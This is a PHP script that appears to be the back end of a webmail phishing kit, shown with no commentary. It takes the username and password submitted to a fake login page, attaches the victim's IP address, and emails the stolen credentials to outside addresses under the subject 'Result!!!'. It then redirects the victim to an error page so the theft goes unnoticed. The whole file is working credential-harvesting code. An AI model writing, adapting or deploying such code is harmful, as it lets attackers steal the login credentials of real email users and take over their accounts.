<?php
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");
$message .= "Webmail Result"."\n";
$message .= "User : ".$_POST['user']."\n";
$message .= "Password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$a = "error.php?email=".$_POST['user'];
mail($recipient,$ip,$message);

$recipient = "resulter1000@protonmail.com, sales@genclerrnermer.com";
$subject = "Result!!!";
$headers = "From: webmail <mofiz@banglamail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "yahoo", $message);
if (mail($recipient,$ip,$message,$headers)) {

	
	echo "<script type='text/javascript'>
		   window.location='$a';
		   </script>";
	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>